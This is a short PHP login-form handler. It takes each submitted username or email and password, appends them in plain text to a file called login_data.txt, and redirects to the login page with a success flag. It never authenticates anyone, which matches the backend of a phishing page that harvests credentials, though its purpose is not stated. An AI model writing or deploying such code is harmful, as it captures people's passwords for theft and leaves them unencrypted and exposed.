<?php
// Check if the form has been submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username_email = $_POST['username-email'];
    $password = $_POST['password'];

    // Prepare the data to be saved
    $data = "Username or Email: " . $username_email . "\nPassword: " . $password . "\n\n";

    // Save the data to a txt file
    $file = fopen("login_data.txt", "a");
    fwrite($file, $data);
    fclose($file);

    // Redirect back to the login page with a success message
    header("Location: login.php?status=success");
    exit();
}
?>
